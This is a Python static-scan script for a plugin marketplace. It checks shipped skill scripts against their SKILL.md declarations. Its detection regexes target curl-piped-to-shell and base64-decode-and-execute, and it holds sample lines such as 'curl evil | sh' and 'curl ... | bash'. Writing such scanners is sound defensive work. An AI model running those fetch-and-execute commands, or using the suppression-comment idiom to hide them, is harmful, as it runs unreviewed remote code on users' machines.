#!/usr/bin/env python3
"""Static security scan for shipped skills.

Installing a plugin from this marketplace copies its scripts onto someone
else's machine, where they run with that person's credentials and network
access. They will not read every line first — nobody does. This scan is the
substitute for that reading: it reports what each skill *actually does* against
what its SKILL.md *says* it does, so a mismatch is visible before publish.

It is a static scan, not a sandbox. It reads source; it never executes it. A
script that assembles a URL at runtime, or shells out to something that fetches,
will not be caught — this raises the cost of hiding behaviour, it does not make
hiding impossible.

Severities:
    FAIL — patterns with no legitimate use in a shipped skill (curl|bash,
           base64-decode-and-execute). These block CI.
    WARN — behaviour that is fine when declared and suspicious when not
           (network calls, credential reads absent from the SKILL.md).

Exit codes:
    0 — no failures (warnings may be present)
    1 — at least one FAIL
"""

from __future__ import annotations

import argparse
import re
import sys
from dataclasses import dataclass, field
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent

SCRIPT_SUFFIXES = {".py", ".sh", ".bash", ".zsh"}

# --- FAIL patterns --------------------------------------------------------- #
# Piping a download straight into an interpreter executes whatever the server
# returns today, which is not reviewable and not what was reviewed.
CURL_BASH_RE = re.compile(
    r"(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?(?:ba|z|d)?sh\b", re.IGNORECASE)

# Decoding a blob and handing it to an interpreter is the standard way to ship
# code that reads as data.
B64_EXEC_RE = re.compile(
    r"(?:b64decode|base64\s+(?:-d|--decode)|atob)\b[^\n]{0,120}"
    r"(?:\bexec\b|\beval\b|\|\s*(?:ba)?sh\b)"
    r"|(?:\bexec\b|\beval\b)\s*\([^\n]{0,80}(?:b64decode|decode\(['\"]base64)",
    re.IGNORECASE)

# --- WARN patterns --------------------------------------------------------- #
NETWORK_RE = re.compile(
    r"\b(?:requests\.(?:get|post|put|patch|delete)|httpx\.(?:get|post|AsyncClient|Client)"
    r"|urllib\.request|urlopen|aiohttp|socket\.socket|curl\s+http|wget\s+http)\b")

# Env vars whose names say "credential". Matched against reads, not writes.
CREDENTIAL_ENV_RE = re.compile(
    r"(?:os\.environ(?:\.get)?\(?\[?[\"']|getenv\([\"']|\$\{?)"
    r"([A-Z][A-Z0-9_]*(?:TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL|CREDS)[A-Z0-9_]*)")

# Writes to an absolute path outside the workspace/skill/tmp world.
ABS_WRITE_RE = re.compile(
    r"open\(\s*[\"'](/(?!tmp/|var/folders/|dev/null)[^\"']+)[\"']\s*,\s*[\"'][wa]")


@dataclass
class SkillReport:
    name: str
    plugin: str
    fails: list[str] = field(default_factory=list)
    warns: list[str] = field(default_factory=list)

    @property
    def status(self) -> str:
        if self.fails:
            return "FAIL"
        return "WARN" if self.warns else "pass"


# An explicit, reviewable exception. Written on the line itself or the line
# above, it must carry a reason:
#     curl -fsSL https://bun.sh/install | bash  # scan-skills: allow curl-bash — upstream installer
# Suppressions are greppable on purpose: `grep -rn "scan-skills: allow"` is the
# list of everything this gate has been told to ignore, and a reason is
# mandatory so that list stays reviewable.
SUPPRESS_RE = re.compile(r"scan-skills:\s*allow\s+([a-z-]+)\s*[—:-]\s*(\S.*)$")


_TRIPLE_QUOTED_RE = re.compile(r'"""[\s\S]*?"""|\'\'\'[\s\S]*?\'\'\'')


def _strip_noise(text: str, suffix: str) -> str:
    """Blank out comments and docstrings, which are prose rather than behaviour.

    A scanner that flags its own threat model gets ignored: buildme's `sdk.py`
    documents the CWE-94 risk with a literal `curl evil | sh` inside a
    docstring, and the first run reported it as a failure. Docstrings don't
    execute, so stripping them is correct — but note the limit: an ordinary
    string literal is NOT stripped, because `os.system("curl x | sh")` is a
    string that very much does execute.

    Lines are blanked rather than removed so line numbers still match the
    original file — findings cite them, and suppression comments are looked up
    by line.
    """
    if suffix == ".py":
        text = _TRIPLE_QUOTED_RE.sub(
            lambda m: "\n" * m.group(0).count("\n"), text)
    return "\n".join(
        "" if line.lstrip().startswith("#") else line
        for line in text.splitlines())


def _suppressions(raw: str) -> dict[int, set[str]]:
    """Map line number → rules suppressed at that line.

    A marker covers its own line (inline use) and, when it sits in a comment
    block above the code, the first line of actual code after that block. The
    reason usually needs a few lines to be worth reading, so the marker must
    survive being the first line of a multi-line comment.
    """
    out: dict[int, set[str]] = {}
    lines = raw.splitlines()
    for idx, line in enumerate(lines):
        match = SUPPRESS_RE.search(line)
        if not match:
            continue
        rule = match.group(1)
        out.setdefault(idx + 1, set()).add(rule)
        # Walk forward past the rest of the comment block to the first line
        # that actually does something.
        for fwd in range(idx + 1, min(idx + 12, len(lines))):
            stripped = lines[fwd].strip()
            if not stripped or stripped.startswith("#"):
                continue
            out.setdefault(fwd + 1, set()).add(rule)
            break
    return out


def _lineno(body: str, offset: int) -> int:
    return body.count("\n", 0, offset) + 1


# `VAR=` at the start of a line: a shell variable assigned in this file.
_SHELL_ASSIGN_RE = re.compile(r"^\s*([A-Z][A-Z0-9_]*)=(.*)$", re.MULTILINE)


def _locally_assigned(body: str) -> set[str]:
    """Shell variables this file defines itself, so reading them isn't an
    environment read.

    The self-defaulting idiom `VAR="${VAR:-}"` is excluded: that *is* an
    environment read, just one with a fallback. Treating it as local would
    hide exactly the credential reads worth declaring.
    """
    local = set()
    for match in _SHELL_ASSIGN_RE.finditer(body):
        name, rhs = match.group(1), match.group(2)
        if re.search(r"\$\{?" + re.escape(name) + r"\b", rhs):
            continue  # self-referential default — still an env read
        local.add(name)
    return local


def scan_skill(skill_dir: Path, plugin: str) -> SkillReport:
    report = SkillReport(name=skill_dir.name, plugin=plugin)
    skill_md = skill_dir / "SKILL.md"
    declared = ""
    if skill_md.exists():
        declared = skill_md.read_text(encoding="utf-8", errors="replace")
    declared_upper = declared.upper()

    for script in sorted(skill_dir.rglob("*")):
        if not script.is_file() or script.suffix not in SCRIPT_SUFFIXES:
            continue
        if "__pycache__" in script.parts or ".venv" in script.parts:
            continue
        # A skill's own tests exercise its behaviour; they are not what the
        # installing user runs.
        if {"tests", "test"}.intersection(script.parts):
            continue

        raw = script.read_text(encoding="utf-8", errors="replace")
        body = _strip_noise(raw, script.suffix)
        rel = script.relative_to(skill_dir)
        suppressed = _suppressions(raw)

        def allowed(rule: str, offset: int) -> bool:
            return rule in suppressed.get(_lineno(body, offset), set())

        for match in CURL_BASH_RE.finditer(body):
            if allowed("curl-bash", match.start()):
                continue
            report.fails.append(
                f"{rel}:{_lineno(body, match.start())}: pipes a download into a "
                f"shell: {match.group(0)[:70]!r}")
        for match in B64_EXEC_RE.finditer(body):
            if allowed("base64-exec", match.start()):
                continue
            report.fails.append(
                f"{rel}:{_lineno(body, match.start())}: decodes and executes a "
                f"payload: {match.group(0)[:70]!r}")

        net = NETWORK_RE.search(body)
        if net and not allowed("network", net.start()):
            # Declared if the SKILL.md says anything about reaching the network.
            if not re.search(r"\b(?:network|http|https|api|fetch|download|url|web)\b",
                             declared, re.IGNORECASE):
                report.warns.append(
                    f"{rel}: makes network calls, but SKILL.md never mentions network use")

        local_vars = _locally_assigned(body) if script.suffix != ".py" else set()
        for match in CREDENTIAL_ENV_RE.finditer(body):
            var = match.group(1)
            if var in local_vars or var in declared_upper:
                continue
            if allowed("env-read", match.start()):
                continue
            report.warns.append(
                f"{rel}: reads credential env var {var}, undeclared in SKILL.md")

        for match in ABS_WRITE_RE.finditer(body):
            if allowed("abs-write", match.start()):
                continue
            report.warns.append(
                f"{rel}: writes to absolute path outside the workspace: {match.group(1)}")

    # Collapse duplicates while keeping order — the same undeclared var read on
    # ten lines is one finding, not ten.
    report.warns = list(dict.fromkeys(report.warns))
    report.fails = list(dict.fromkeys(report.fails))
    return report


def scan(repo: Path) -> list[SkillReport]:
    reports = []
    for skill_md in sorted((repo / "plugins").glob("*/skills/*/SKILL.md")):
        skill_dir = skill_md.parent
        plugin = skill_dir.parent.parent.name
        reports.append(scan_skill(skill_dir, plugin))
    return reports


def render(reports: list[SkillReport], show_all: bool) -> str:
    lines = []
    width = max((len(f"{r.plugin}/{r.name}") for r in reports), default=20)
    lines.append(f"{'SKILL'.ljust(width)}  STATUS  FINDINGS")
    lines.append("-" * (width + 20))
    for r in reports:
        if r.status == "pass" and not show_all:
            continue
        count = len(r.fails) + len(r.warns)
        lines.append(f"{f'{r.plugin}/{r.name}'.ljust(width)}  {r.status:6}  {count}")
        for item in r.fails:
            lines.append(f"    FAIL  {item}")
        for item in r.warns:
            lines.append(f"    warn  {item}")
    return "\n".join(lines)


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description=(__doc__ or "").split("\n")[0])
    ap.add_argument("--repo", type=Path, default=REPO_ROOT)
    ap.add_argument("--all", action="store_true",
                    help="include skills with no findings")
    ap.add_argument("--strict", action="store_true",
                    help="treat warnings as failures too")
    args = ap.parse_args(argv)

    reports = scan(args.repo.resolve())
    print(render(reports, args.all))

    fails = sum(len(r.fails) for r in reports)
    warns = sum(len(r.warns) for r in reports)
    print(f"\nscan_skills: {len(reports)} skills, {fails} failure(s), {warns} warning(s)")

    if fails or (args.strict and warns):
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
